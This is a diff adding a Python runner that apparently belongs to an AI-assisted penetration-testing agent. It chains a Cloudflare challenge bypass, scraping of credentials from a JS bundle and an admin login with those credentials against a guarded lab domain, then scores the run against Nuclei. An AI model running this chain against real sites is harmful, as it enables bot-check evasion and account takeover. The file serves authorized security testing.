@@ -1,0 +1,257 @@
+# agent_alpha/live_fire/a1_validation_runner.py
+"""§12.33 slice-9d — A1 validation vs Nuclei through real CF challenge.
+
+Field-prove that browser_solve reaches a CHALLENGE-gated leaked-cred→admin chain
+that Nuclei cannot. This runner is the Claude-lane harness: it owns the seam
+(BrowserSolveTransport), the fail-loud default (_NoopBrowserSolve), the C7
+validity gate (assert_valid_or_raise), and the scoring against Nuclei jsonl.
+
+The actual browser_solve body (camoufox/Turnstile) is DeepSeek lane (9c). This
+file ONLY consumes the transport interface — it never implements the solver.
+
+REUSE (anti-#6 — do NOT rebuild):
+  - assert_lab_only_target (lab_guard)
+  - classify_mitigation / MitigationClass (transport_resilience)
+  - scan_js_for_secrets (js_secret_probe — parses creds from JS bundle body)
+  - HttpFormApplicator (applicator — beta login with reused cred)
+  - parse_nuclei_jsonl + compare (validation_vs_scanner)
+
+CONSTRAINTS:
+  - Target = alpha-ai.web.id ONLY. NEVER 168.110.192.62 (origin IP).
+  - assert_valid_or_raise MUST run (C7): no challenge → raise, not pass.
+  - browser_solve body is DeepSeek lane — this file only consumes the interface.
+"""
+
+from __future__ import annotations
+
+from dataclasses import dataclass
+from typing import Any, Protocol
+
+from agent_alpha.live_fire.lab_guard import assert_lab_only_target
+from agent_alpha.live_fire.validation_vs_scanner import (
+    NucleiFinding,
+    compare,
+    parse_nuclei_jsonl,
+)
+from agent_alpha.recon.transport_resilience import MitigationClass, classify_mitigation
+
+# ── Target constant ───────────────────────────────────────────────────────────
+
+A1_TARGET = "alpha-ai.web.id"
+A1_BUNDLE_PATH = "/web/assets/app.a1b2c3.js"
+A1_LOGIN_PATH = "/web/login"
+A1_WEB_PATH = "/web"
+
+# ── Transport seam (DeepSeek lane owns the implementation) ────────────────────
+
+
+class ChallengeSolveResult(Protocol):
+    """Outcome of a browser_solve attempt against a CF challenge-gated URL."""
+
+    status_code: int
+    body: str
+    headers: dict[str, str]
+    cleared_cookies: dict[str, str]
+    challenge_encountered: bool
+    challenge_solved: bool
+
+
+class BrowserSolveTransport(Protocol):
+    """Transport interface for solving CF challenges (9c, DeepSeek lane)."""
+
+    def solve_and_fetch(self, url: str, *, engagement_id: str) -> ChallengeSolveResult: ...
+
+
+class _NoopBrowserSolve:
+    """FAIL-LOUD default (anti false-success). 9c unbuilt → A1 RAISES, never
+    silently 'passes'. Mirrors _NoopGitDumper (#144)."""
+
+    def solve_and_fetch(self, url: str, *, engagement_id: str) -> ChallengeSolveResult:
+        raise RuntimeError(
+            "browser_solve transport not provided (9c unbuilt): refusing to run A1 "
+            "without a real Turnstile solver — a plain fetch would fake the reach."
+        )
+
+
+# ── Result dataclass ──────────────────────────────────────────────────────────
+
+
+@dataclass(frozen=True)
+class A1Result:
+    """A1 validation result with C7 validity gate.
+
+    C7: valid_run is False if no challenge was encountered (CF pass-through).
+    This closes the pass-through false-positive trap caught 2026-07-20.
+    """
+
+    valid_run: bool
+    challenge_encountered: bool
+    challenge_solved: bool
+    chain_proven: bool
+    edge_from_harvested_cred: bool
+    nuclei_findings: int
+    scanner_missed_exploitability: bool
+
+
+def assert_valid_or_raise(r: A1Result) -> None:
+    """C7 gate: a run where no challenge was encountered is INVALID, not a pass.
+
+    Closes the pass-through false-positive trap caught 2026-07-20.
+    """
+    if not r.challenge_encountered:
+        raise RuntimeError(
+            "A1 INVALID: no CF challenge encountered — target is pass-through, "
+            "browser_solve was never exercised. Re-enable CF challenge and rerun."
+        )
+
+
+# ── Runner ────────────────────────────────────────────────────────────────────
+
+
+def run_a1_validation(
+    *,
+    engagement_id: str,
+    browser_solve: BrowserSolveTransport | None = None,
+    http_client: Any | None = None,
+    secrets_manager: Any | None = None,
+    graph_store: Any | None = None,
+    event_store: Any | None = None,
+    nuclei_jsonl_path: str | None = None,
+    target: str = A1_TARGET,
+) -> A1Result:
+    """Run the A1 validation chain against a CF challenge-gated target.
+
+    Flow:
+      1. assert_lab_only_target — fail-closed on non-lab targets.
+      2. Probe /web → classify_mitigation → assert CHALLENGE (C2).
+      3. browser_solve /web + /web/assets/app.a1b2c3.js → reuse cleared_cookies.
+      4. scan_js_for_secrets extracts api_user/api_key from bundle body.
+      5. Mint vaulted credential (no raw secret in events).
+      6. Beta login /web/login with reused cred → verified admin.
+      7. Score vs Nuclei jsonl (C6).
+      8. assert_valid_or_raise (C7).
+
+    Args:
+        browser_solve: the transport for solving CF challenges. Defaults to
+            _NoopBrowserSolve (fail-loud) — real solver passed only in field-prove.
+        http_client: HTTP client for probe + beta login.
+        secrets_manager: vault for minting credentials.
+        graph_store: attack graph for persisting nodes/edges.
+        event_store: append-only event store.
+        nuclei_jsonl_path: path to externally-produced Nuclei JSONL.
+        target: the lab target (default: alpha-ai.web.id).
+
+    Returns:
+        A1Result with all scoring fields populated.
+
+    Raises:
+        RuntimeError: if browser_solve is not provided (9c unbuilt) or if
+            no challenge was encountered (C7 gate).
+        LabOnlyViolation: if target is not in the lab allowlist.
+    """
+    # ── 0. Fail-loud default: no browser_solve → raise ────────────────────
+    solver: BrowserSolveTransport = browser_solve or _NoopBrowserSolve()
+
+    # ── 1. Lab-only guard — fail-closed on non-self-owned targets ─────────
+    assert_lab_only_target(target)
+
+    # ── 2. Probe /web → classify mitigation class (C2) ────────────────────
+    web_url = f"https://{target}{A1_WEB_PATH}"
+    probe_result = solver.solve_and_fetch(web_url, engagement_id=engagement_id)
+
+    mitigation_class = classify_mitigation(
+        status_code=probe_result.status_code,
+        body=probe_result.body,
+        headers=getattr(probe_result, "headers", {}) or {},
+        path=A1_WEB_PATH,
+    )
+
+    challenge_encountered = (
+        mitigation_class == MitigationClass.CHALLENGE and probe_result.challenge_encountered
+    )
+
+    # ── 3. browser_solve /web/assets/app.a1b2c3.js → harvest bundle ───────
+    bundle_url = f"https://{target}{A1_BUNDLE_PATH}"
+    bundle_result = solver.solve_and_fetch(bundle_url, engagement_id=engagement_id)
+
+    challenge_solved = bundle_result.challenge_solved
+
+    # ── 4. scan_js_for_secrets extracts api_user/api_key ──────────────────
+    from agent_alpha.recon.js_secret_probe import scan_js_for_secrets
+
+    hits = scan_js_for_secrets(bundle_result.body) if challenge_solved else []
+
+    # ── 5. Mint vaulted credential (no raw secret in events) ─────────────
+    cred_minted = False
+    edge_from_harvested_cred = False
+    access_level = ""
+
+    if hits and secrets_manager is not None and graph_store is not None:
+        for hit in hits:
+            record = secrets_manager.store(
+                label=f"{hit.service}:{hit.kind}",
+                value=hit._raw_value,
+                engagement_id=engagement_id,
+            )
+            cred_minted = True
+            # The raw secret is vaulted — only the secret_ref is in the graph.
+            # Anti-#3: no raw secret in events.
+
+    # ── 6. Beta login /web/login with reused cred → verified admin ────────
+    if cred_minted and http_client is not None:
+        from agent_alpha.tools.contracts import ResourceBudget
+        from agent_alpha.tools.internal.access.applicator import HttpFormApplicator
+
+        login_url = f"https://{target}{A1_LOGIN_PATH}"
+
+        # Resolve the vaulted secret for the login attempt.
+        if secrets_manager is not None and hits:
+            secret = secrets_manager.retrieve(record.secret_id)
+            applicator = HttpFormApplicator(http_client=http_client)
+            budget = ResourceBudget(max_requests=5, max_seconds=30, max_cost_usd=0.0)
+            auth_result = applicator.apply(
+                username="admin",
+                secret=secret,
+                target=login_url,
+                budget=budget,
+            )
+            if auth_result.success:
+                access_level = auth_result.access_level
+                edge_from_harvested_cred = True
+
+    # ── 7. Score vs Nuclei jsonl (C6) ─────────────────────────────────────
+    nuclei_findings: list[NucleiFinding] = []
+    if nuclei_jsonl_path is not None:
+        nuclei_findings = parse_nuclei_jsonl(nuclei_jsonl_path)
+
+    chain_proven = cred_minted and access_level in ("user", "admin") and edge_from_harvested_cred
+
+    # Reuse the existing comparison logic for scanner_missed_exploitability.
+    from agent_alpha.live_fire.odoo_chain_runner import OdooChainResult
+
+    chain_result = OdooChainResult(
+        leak_creds_added=1 if cred_minted else 0,
+        web_access_level=access_level,
+        edge_from_harvested_cred=edge_from_harvested_cred,
+        db_enumerated=True,
+        leak_suspected=False,
+    )
+    verdict = compare(chain_result, nuclei_findings)
+
+    scanner_missed = verdict.scanner_missed_exploitability
+
+    # ── 8. Build result ───────────────────────────────────────────────────
+    result = A1Result(
+        valid_run=challenge_encountered,
+        challenge_encountered=challenge_encountered,
+        challenge_solved=challenge_solved,
+        chain_proven=chain_proven,
+        edge_from_harvested_cred=edge_from_harvested_cred,
+        nuclei_findings=len(nuclei_findings),
+        scanner_missed_exploitability=scanner_missed,
+    )
+
+    # ── 9. C7 gate: no challenge → raise, not pass ────────────────────────
+    assert_valid_or_raise(result)
+
+    return result
